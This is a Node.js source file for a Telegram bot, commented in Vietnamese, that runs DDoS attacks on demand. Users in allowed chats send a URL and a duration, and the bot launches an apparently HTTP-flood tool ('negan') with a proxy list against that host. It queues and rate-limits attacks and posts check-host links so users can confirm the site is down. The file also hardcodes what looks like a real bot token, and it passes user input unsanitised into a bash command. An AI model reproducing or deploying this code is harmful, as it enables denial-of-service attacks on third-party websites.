const TelegramBot = require('node-telegram-bot-api');
const { exec } = require('child_process');

// Cấu hình
const token = '7935173392:AAFYFVwBtjee7R33I64gcB3CE_-veYkU4lU';
const adminId = 1243471275;
const allowedGroupIds = new Set([-1002423723717, 987654321, 112233445, 556677889, 998877665]);
const maxConcurrentAttacks = 3, maxSlot = 1, maxTimeAttacks = 120;

// Khởi tạo bot
const bot = new TelegramBot(token, { polling: true });
const currentAttacks = new Map(), attackQueue = [];

bot.sendMessage(adminId, '[Version PRO] 🤖 Bot is ready to receive commands.');

const getVietnamTime = () => new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' });

const sendJsonMessage = async (chatId, message, buttons = []) => {
    try {
        await bot.sendMessage(chatId, JSON.stringify(message, null, 2), { parse_mode: 'HTML', reply_markup: { inline_keyboard: buttons } });
    } catch (error) {
        console.error(`[ERROR] Gửi tin nhắn thất bại: ${error.message}`);
    }
};

const executeCommand = async ({ chatId, command, host, time, username }) => {
    const pid = Math.floor(Math.random() * 10000);
    const startTime = getVietnamTime();

    await sendJsonMessage(chatId, {
        status: "🚀Successfully🚀", pid, website: host, time: `${time} Giây`, caller: username, startTime,
        maxSlots: maxSlot, checkHost: `Check Host (https://check-host.net/check-http?host=${host})`,
        hostTracker: `Host Tracker (https://www.host-tracker.com/en/ic/check-http?url=${host})`
    }, [[{ text: 'Check Host', url: `https://check-host.net/check-http?host=${host}` }],
        [{ text: 'Host Tracker', url: `https://www.host-tracker.com/en/ic/check-http?url=${host}` }]]);

    const child = exec(command, { shell: '/bin/bash' });
    child.on('close', () => {
        sendJsonMessage(chatId, { status: "✅Process completed✅", pid, website: host, time: `${time} Giây`, caller: username, endTime: getVietnamTime() });
        currentAttacks.delete(chatId);
        if (attackQueue.length) executeCommand(attackQueue.shift());
    });
};

bot.on('message', async (msg) => {
    const chatId = msg.chat.id, text = msg.text, username = msg.from.username || msg.from.first_name;
    const isAdmin = chatId === adminId, isGroup = allowedGroupIds.has(chatId);
    if (!isAdmin && !isGroup) return;

    if (text.startsWith('http://') || text.startsWith('https://')) {
        const [host, time] = text.split(' ');
        if (!host || isNaN(time) || time > maxTimeAttacks) return;

        const userAttacks = [...currentAttacks.values()].filter(a => a.user === chatId).length;
        if (userAttacks >= maxSlot) {
            return bot.sendMessage(chatId, `🚫 Bạn có lệnh đang chạy. Vui lòng chờ...`, { parse_mode: 'HTML' });
        }

        if (currentAttacks.size >= maxConcurrentAttacks) {
            attackQueue.push({ chatId, command: `node ./negan -m GET -u ${host} -p live.txt --full true -s ${time}`, host, time, username });
            return bot.sendMessage(chatId, '⏳ Lệnh của bạn đã được thêm vào hàng đợi.', { parse_mode: 'HTML' });
        }

        currentAttacks.set(chatId, { user: chatId, command: `node ./negan -m GET -u ${host} -p live.txt --full true -s ${time}` });
        executeCommand({ chatId, command: `node ./negan -m GET -u ${host} -p live.txt --full true -s ${time}`, host, time, username });
    }
});
